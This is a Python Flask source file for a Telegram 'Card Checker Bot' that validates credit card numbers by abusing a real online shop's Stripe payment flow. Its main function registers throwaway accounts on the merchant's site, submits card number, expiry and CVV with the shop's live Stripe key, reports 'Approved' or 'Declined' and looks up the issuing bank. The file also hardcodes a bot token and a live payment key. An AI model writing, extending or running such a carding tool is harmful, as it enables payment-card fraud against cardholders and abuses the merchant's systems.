from flask import Flask, request, jsonify
import requests
import re
import threading
import random
import string
import time

# --- Configuration ---
BOT_TOKEN = '8323578379:AAFDGDFlHEEakTK3Mw49ANizwsbewPAaWKo'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
app = Flask(__name__)

# --- Logic for Stripe Auth ---
def stripe_auth_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'})
    
    # Ensure year is 2 digits
    if len(yy) == 4: 
        yy = yy[-2:]
    
    try:
        # Get login page
        login_page_res = session.get('https://shop.wiseacrebrew.com/account/', timeout=30)
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        
        if not login_nonce_match:
            return {"status": "Declined", "response": "Failed to get login nonce.", "decline_type": "process_error"}
        
        login_nonce = login_nonce_match.group(1)
        random_email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
        
        # Register
        register_data = {
            'email': random_email, 
            'password': 'Password123!', 
            'woocommerce-register-nonce': login_nonce, 
            '_wp_http_referer': '/account/', 
            'register': 'Register'
        }
        session.post('https://shop.wiseacrebrew.com/account/', data=register_data, timeout=30)
        
        # Get payment page
        payment_page_res = session.get('https://shop.wiseacrebrew.com/account/add-payment-method/', timeout=30)
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        
        if not payment_nonce_match:
            return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
        
        ajax_nonce = payment_nonce_match.group(1)
        
        # Create Stripe payment method
        stripe_data = (f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
                       '&key=pk_live_51TWskSF79lbCDrn2YUT5OTMiCtJOtfjPRdu5Fvi77BXKcyrqYdDV43q7k7XTJlO8docnOY45e6KdcPZdYzPoyFRr00Xlnsy2Wn')
        
        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, timeout=30)
        
        if stripe_response.status_code == 402:
            return {"status": "Declined", "response": stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.'), "decline_type": "card_decline"}
        
        payment_token = stripe_response.json().get('id')
        if not payment_token:
            return {"status": "Declined", "response": "Failed to retrieve Stripe token.", "decline_type": "process_error"}
        
        # Confirm setup intent
        site_data = {
            'action': 'create_and_confirm_setup_intent', 
            'wc-stripe-payment-method': payment_token, 
            'wc-stripe-payment-type': 'card', 
            '_ajax_nonce': ajax_nonce
        }
        
        final_response = session.post('https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', data=site_data, timeout=30)
        response_json = final_response.json()
        
        if response_json.get('success') is False or response_json.get('status') == 'error':
            error_message = (response_json.get('data', {}).get('error', {}).get('message') or 
                           re.sub('<[^<]+?>', '', response_json.get('messages', 'Declined by website.')))
            return {"status": "Declined", "response": error_message.strip(), "decline_type": "card_decline"}
        
        if response_json.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Payment method successfully added.", "decline_type": "none"}
        else:
            return {"status": "Declined", "response": "Unknown response from website.", "decline_type": "process_error"}
            
    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}", "decline_type": "process_error"}

# --- Logic for Braintree Auth ---
def braintree_check(cc, mm, yy, cvv):
    # Simulasi Braintree check - ganti dengan logic asli jika ada
    time.sleep(2)  # Simulasi proses slow
    return {"status": "Declined", "response": "Braintree gateway not configured yet.", "decline_type": "process_error"}

# --- Logic for Stripe Charge ---
def stripe_charge_check(cc, mm, yy, cvv):
    # Simulasi Stripe Charge - ganti dengan logic asli jika ada
    time.sleep(2)  # Simulasi proses slow
    return {"status": "Declined", "response": "Stripe Charge gateway not configured yet.", "decline_type": "process_error"}

# --- BIN Info Function ---
def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code == 200:
            return response.json()
        return {}
    except Exception:
        return {}

# --- Background Task Function ---
def background_task(chat_id, message_id, full_cc_string, gateway_function, gateway_name, original_text=""):
    try:
        cc, mm, yy, cvv = full_cc_string.split('|')
        check_result = gateway_function(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])
        
        status = check_result.get('status', 'Declined')
        response_message = check_result.get('response', 'No response.')
        
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        country = bin_info.get('country_name', 'Unknown')
        country_flag = bin_info.get('country_flag', '')
        bank = bin_info.get('bank', 'Unknown')
        
        if status == "Approved":
            final_message = f"""✅ <b>APPROVED ({gateway_name})</b> ✅

💳 <b>Card:</b> <code>{full_cc_string}</code>
📝 <b>Response:</b> {response_message}

ℹ️ <b>Info:</b> {brand} - {card_type}
🏦 <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {country} {country_flag}"""
        else:
            final_message = f"""❌ <b>DECLINED ({gateway_name})</b> ❌

💳 <b>Card:</b> <code>{full_cc_string}</code>
📝 <b>Response:</b> {response_message}

ℹ️ <b>Info:</b> {brand} - {card_type}
🏦 <b>Issuer:</b> {bank}
🌍 <b>Country:</b> {country} {country_flag}"""
        
        # Edit original message
        edit_url = TELEGRAM_API_URL + "editMessageText"
        payload = {
            'chat_id': chat_id, 
            'message_id': message_id, 
            'text': final_message, 
            'parse_mode': 'HTML'
        }
        requests.post(edit_url, json=payload, timeout=30)
        
    except Exception as e:
        # Send error message
        edit_url = TELEGRAM_API_URL + "editMessageText"
        error_msg = f"❌ <b>Error processing card</b> ❌\n\n<code>{str(e)}</code>"
        requests.post(edit_url, json={'chat_id': chat_id, 'message_id': message_id, 'text': error_msg, 'parse_mode': 'HTML'}, timeout=30)

# --- Telegram Webhook Handler ---
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        
        if 'message' in data:
            message = data['message']
            chat_id = message['chat']['id']
            text = message.get('text', '')
            
            # Handle /start command
            if text == '/start':
                welcome_msg = """🤖 <b>Card Checker Bot Active!</b> 🤖

<b>Available Commands:</b>
• /stripe_auth <cc|mm|yy|cvv> - Check card with Stripe Auth (Fast)
• /braintree <cc|mm|yy|cvv> - Check card with Braintree (Slow)
• /stripe_charge <cc|mm|yy|cvv> - Check card with Stripe Charge (Slow)

<b>Example:</b>
<code>/stripe_auth 4111111111111111|12|25|123</code>

<b>Format:</b> CC|MM|YY|CVV"""
                
                send_message(chat_id, welcome_msg)
                return jsonify({"status": "ok"})
            
            # Parse commands
            if text.startswith('/stripe_auth'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_message(chat_id, "❌ Please provide card details!\nFormat: /stripe_auth CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                card_str = parts[1].strip()
                
                # Validate format
                if not re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', card_str):
                    send_message(chat_id, "❌ Invalid format!\nUse: CC|MM|YY|CVV\nExample: 4111111111111111|12|25|123")
                    return jsonify({"status": "ok"})
                
                # Send processing message
                msg = send_message(chat_id, f"🔄 <b>Processing Stripe Auth...</b>\n\n💳 Card: <code>{card_str}</code>", parse_mode='HTML')
                
                # Process in background
                thread = threading.Thread(
                    target=background_task, 
                    args=(chat_id, msg['message_id'], card_str, stripe_auth_check, "Stripe Auth")
                )
                thread.start()
                
            elif text.startswith('/braintree'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_message(chat_id, "❌ Please provide card details!\nFormat: /braintree CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                card_str = parts[1].strip()
                
                if not re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', card_str):
                    send_message(chat_id, "❌ Invalid format!\nUse: CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                msg = send_message(chat_id, f"🔄 <b>Processing Braintree (Slow)...</b>\n\n💳 Card: <code>{card_str}</code>", parse_mode='HTML')
                
                thread = threading.Thread(
                    target=background_task, 
                    args=(chat_id, msg['message_id'], card_str, braintree_check, "Braintree")
                )
                thread.start()
                
            elif text.startswith('/stripe_charge'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_message(chat_id, "❌ Please provide card details!\nFormat: /stripe_charge CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                card_str = parts[1].strip()
                
                if not re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', card_str):
                    send_message(chat_id, "❌ Invalid format!\nUse: CC|MM|YY|CVV")
                    return jsonify({"status": "ok"})
                
                msg = send_message(chat_id, f"🔄 <b>Processing Stripe Charge (Slow)...</b>\n\n💳 Card: <code>{card_str}</code>", parse_mode='HTML')
                
                thread = threading.Thread(
                    target=background_task, 
                    args=(chat_id, msg['message_id'], card_str, stripe_charge_check, "Stripe Charge")
                )
                thread.start()
        
        return jsonify({"status": "ok"})
        
    except Exception as e:
        print(f"Webhook error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 200

# --- Helper function to send message ---
def send_message(chat_id, text, parse_mode='HTML'):
    url = TELEGRAM_API_URL + "sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode
    }
    response = requests.post(url, json=payload, timeout=30)
    return response.json().get('result', {})

# --- Set Webhook Endpoint ---
@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://{request.host}/webhook/{BOT_TOKEN}"
    url = TELEGRAM_API_URL + "setWebhook"
    response = requests.post(url, json={'url': webhook_url})
    return jsonify(response.json())

# --- Remove Webhook ---
@app.route('/remove_webhook', methods=['GET'])
def remove_webhook():
    url = TELEGRAM_API_URL + "deleteWebhook"
    response = requests.post(url)
    return jsonify(response.json())

# --- Webhook Info ---
@app.route('/webhook_info', methods=['GET'])
def webhook_info():
    url = TELEGRAM_API_URL + "getWebhookInfo"
    response = requests.get(url)
    return jsonify(response.json())

# --- Root Endpoint ---
@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "active",
        "bot": "Card Checker Bot",
        "endpoints": {
            "webhook": f"/webhook/{BOT_TOKEN}",
            "set_webhook": "/set_webhook",
            "remove_webhook": "/remove_webhook",
            "stripe_auth": "/stripe_auth?card=CC|MM|YY|CVV"
        }
    })

# --- Old API Endpoints (for compatibility) ---
@app.route('/stripe_auth', methods=['GET'])
def stripe_auth_endpoint():
    card_str = request.args.get('card')
    if not card_str:
        return jsonify({"error": "Card parameter required"}), 400
    
    try:
        cc, mm, yy, cvv = card_str.split('|')
        check_result = stripe_auth_check(cc, mm, yy, cvv)
        bin_info = get_bin_info(cc[:6])
        final_result = {"status": check_result["status"], "response": check_result["response"], "bin_info": bin_info}
        return jsonify(final_result)
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/braintree', methods=['POST'])
def braintree_endpoint():
    data = request.get_json()
    if not data or 'chat_id' not in data or 'message_id' not in data or 'card' not in data:
        return jsonify({"error": "Missing required fields"}), 400
    
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card'], braintree_check, "Braintree"))
    thread.start()
    return jsonify({"status": "Process started."})

@app.route('/stripe_charge', methods=['POST'])
def stripe_charge_endpoint():
    data = request.get_json()
    if not data or 'chat_id' not in data or 'message_id' not in data or 'card' not in data:
        return jsonify({"error": "Missing required fields"}), 400
    
    thread = threading.Thread(target=background_task, args=(data['chat_id'], data['message_id'], data['card'], stripe_charge_check, "Stripe Charge"))
    thread.start()
    return jsonify({"status": "Process started."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
